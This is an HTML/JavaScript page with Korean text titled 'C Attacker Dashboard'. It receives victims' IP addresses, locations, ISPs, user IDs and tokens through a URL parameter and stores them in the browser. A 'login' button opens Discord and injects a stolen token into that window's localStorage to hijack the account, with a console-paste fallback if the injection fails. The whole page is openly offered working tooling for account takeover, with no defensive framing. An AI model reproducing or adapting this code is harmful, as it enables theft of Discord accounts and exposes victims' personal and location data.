<!DOCTYPE html>
<html lang="ko">
<head>
  <meta charset="UTF-8">
  <title>C Attacker Dashboard</title>
  <style>
    * { margin:0; padding:0; box-sizing:border-box; font-family:'Segoe UI', sans-serif; }
    body { background:#0b0b12; color:#eee; padding:20px; }
    .container { max-width:1200px; margin:0 auto; }
    h1 { color:#ff3b3b; border-bottom:2px solid #ff3b3b44; padding-bottom:10px; margin-bottom:20px; }
    .status { background:#1a1a2e; padding:12px 18px; border-radius:10px; margin-bottom:20px; display:flex; justify-content:space-between; align-items:center; }
    .panel { background:#14141f; border-radius:12px; padding:20px; overflow-x:auto; }
    table { width:100%; border-collapse:collapse; font-size:13px; }
    th { text-align:left; padding:10px 8px; background:#1f1f33; border-bottom:1px solid #333; }
    td { padding:10px 8px; border-bottom:1px solid #222; word-break:break-all; }
    .token-col { max-width:180px; font-family:monospace; font-size:12px; color:#aaf; }
    .btn { padding:4px 10px; border:none; border-radius:4px; cursor:pointer; font-weight:600; font-size:12px; }
    .btn-login { background:#5865F2; color:#fff; }
    .btn-login:hover { background:#4752c4; }
    .btn-del { background:#e74c3c; color:#fff; }
    .btn-del:hover { background:#c0392b; }
    .btn-clear { background:#333; color:#eee; padding:6px 14px; border-radius:6px; border:none; cursor:pointer; }
    .btn-clear:hover { background:#444; }
    .empty { text-align:center; padding:40px 0; color:#555; }
    .footer { margin-top:20px; color:#444; font-size:12px; text-align:right; }
    .debug-box { background:#1a1a2e; padding:10px; border-radius:6px; margin-top:15px; font-size:12px; color:#0f0; font-family:monospace; max-height:200px; overflow-y:auto; }
  </style>
</head>
<body>
<div class="container">
  <h1>⚡ C Attacker</h1>
  <div class="status">
    <span>📡 수집된 로그: <span id="countDisplay">0</span> / 20</span>
    <button class="btn-clear" onclick="clearAll()">🗑 전체 삭제</button>
  </div>
  <div class="panel">
    <table>
      <thead>
        <tr>
          <th>#</th>
          <th>IP</th>
          <th>위치</th>
          <th>통신사</th>
          <th>유저 ID</th>
          <th>토큰</th>
          <th>액션</th>
        </tr>
      </thead>
      <tbody id="logTableBody">
        <tr><td colspan="7" class="empty">아직 수집된 로그가 없습니다.</td></tr>
      </tbody>
    </table>
  </div>
  <div class="debug-box" id="debug"></div>
  <div class="footer">C Attacker v5.0 · 최대 20명</div>
</div>

<script>
  const debug = document.getElementById('debug');
  function dlog(msg) {
    debug.textContent += msg + '\n';
    console.log(msg);
  }

  dlog('🚀 대시보드 로드 시작');
  dlog('📍 현재 URL: ' + window.location.href);

  // ===== 데이터 저장소 =====
  let logs = JSON.parse(localStorage.getItem('attacker_logs')) || [];
  dlog('📂 저장된 로그 수: ' + logs.length);
  const MAX = 20;

  // ===== 렌더링 =====
  function renderTable() {
    const tbody = document.getElementById('logTableBody');
    document.getElementById('countDisplay').textContent = logs.length;
    dlog('🔄 테이블 렌더링, 로그 수: ' + logs.length);

    if (logs.length === 0) {
      tbody.innerHTML = `<tr><td colspan="7" class="empty">아직 수집된 로그가 없습니다.</td></tr>`;
      return;
    }

    let html = '';
    logs.forEach((log, i) => {
      html += `
        <tr>
          <td>${i+1}</td>
          <td>${log.ip || 'IP 없음'}</td>
          <td>${log.city || ''} ${log.region || ''} ${log.country || ''}</td>
          <td>${log.isp || '알 수 없음'}</td>
          <td style="font-family:monospace;font-size:12px;">${log.userId || '알 수 없음'}</td>
          <td class="token-col">${log.token || '토큰 없음'}</td>
          <td>
            <button class="btn btn-login" onclick="loginToken('${log.token}')">🔓 로그인</button>
            <button class="btn btn-del" onclick="deleteLog(${i})">✕</button>
          </td>
        </tr>
      `;
    });
    tbody.innerHTML = html;
  }

  // ===== 로그 추가 (무조건 저장) =====
  function addLog(logData) {
    dlog('📥 addLog 호출됨');
    dlog('📦 데이터: ' + JSON.stringify(logData, null, 2));

    if (!logData) {
      dlog('❌ logData가 null/undefined');
      alert('⚠️ 데이터가 없습니다.');
      return false;
    }

    if (logs.length >= MAX) {
      dlog('❌ 최대 인원 초과 (20명)');
      alert('⚠️ 최대 20명까지 저장 가능합니다.');
      return false;
    }

    // IP와 토큰이 모두 없어도 일단 저장 (디버깅용)
    const entry = {
      ip: logData.ip || 'IP 없음',
      city: logData.city || '알 수 없음',
      region: logData.region || '알 수 없음',
      country: logData.country || '알 수 없음',
      isp: logData.isp || '알 수 없음',
      lat: logData.lat || '없음',
      lon: logData.lon || '없음',
      token: logData.token || '토큰 없음',
      userId: logData.userId || '알 수 없음'
    };

    dlog('📝 저장할 항목: ' + JSON.stringify(entry, null, 2));

    logs.push(entry);
    localStorage.setItem('attacker_logs', JSON.stringify(logs));
    renderTable();
    dlog('✅ 로그 저장 성공! 현재 총 ' + logs.length + '개');

    alert('✅ 로그가 성공적으로 저장되었습니다!');
    return true;
  }

  // ===== 삭제 =====
  function deleteLog(index) {
    if (!confirm('이 로그를 삭제하시겠습니까?')) return;
    logs.splice(index, 1);
    localStorage.setItem('attacker_logs', JSON.stringify(logs));
    renderTable();
    dlog('🗑️ 로그 삭제됨, 현재 ' + logs.length + '개');
  }

  function clearAll() {
    if (!confirm('모든 로그를 삭제하시겠습니까?')) return;
    logs = [];
    localStorage.setItem('attacker_logs', JSON.stringify(logs));
    renderTable();
    dlog('🗑️ 전체 삭제 완료');
  }

  // ===== 로그인 =====
  function loginToken(token) {
    if (!token || token === '토큰 없음') {
      alert('유효한 토큰이 아닙니다.');
      return;
    }
    const win = window.open('https://discord.com/app', '_blank');
    if (!win) {
      alert('팝업 차단을 해제해주세요.');
      return;
    }
    const script = `
      localStorage.setItem('token', JSON.stringify("${token}"));
      location.reload();
    `;
    setTimeout(() => {
      try { win.eval(script); } catch(e) {
        alert('로그인 실패. 콘솔에서 수동 실행:\n' + script);
      }
    }, 1500);
    alert('✅ 로그인 시도 중...');
  }

  // ===== URL 파라미터 처리 =====
  (function init() {
    const params = new URLSearchParams(window.location.search);
    const logParam = params.get('log');
    dlog('🔍 log 파라미터: ' + (logParam || '없음'));

    if (logParam) {
      try {
        const decoded = decodeURIComponent(logParam);
        dlog('📥 디코딩된 데이터: ' + decoded);
        const data = Object.fromEntries(new URLSearchParams(decoded));
        dlog('📦 파싱된 데이터: ' + JSON.stringify(data, null, 2));
        addLog(data);

        // URL 정리
        if (window.history && window.history.replaceState) {
          window.history.replaceState({}, document.title, window.location.pathname);
          dlog('🧹 URL 정리 완료');
        }
      } catch(e) {
        dlog('❌ 오류 발생: ' + e.message);
        alert('❌ 데이터 처리 중 오류 발생: ' + e.message);
      }
    } else {
      dlog('ℹ️ log 파라미터 없음 (대시보드 직접 접속)');
    }

    renderTable();
    dlog('✅ 대시보드 로드 완료');
  })();

  window.addLog = addLog;
</script>
</body>
</html>
